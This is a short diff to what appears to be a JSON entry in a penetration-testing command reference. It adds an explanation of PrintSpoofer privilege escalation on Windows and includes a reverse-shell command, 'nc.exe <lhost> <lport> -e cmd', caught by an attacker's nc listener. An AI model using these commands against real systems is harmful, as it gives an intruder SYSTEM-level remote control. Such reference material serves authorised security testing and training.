@@ -132,5 +132,6 @@
       "label": "Catch the SYSTEM shell",
       "command": "# nc -lvnp <lport> on attacker"
     }
-  ]
+  ],
+  "explain": "Abuses SeImpersonatePrivilege via the print spooler pipe to become SYSTEM (PrintSpoofer):\n  PrintSpoofer.exe         the potato exploit\n  -c \"c:\\tools\\nc.exe <lhost> <lport> -e cmd\"   the command to run as SYSTEM (here a reverse shell)\nConfirm SeImpersonate with whoami /priv, catch the shell on your listener. Works on Windows 10 / Server 2016-2019 where JuicyPotato fails; GodPotato/RoguePotato cover 2019/2022."
 }
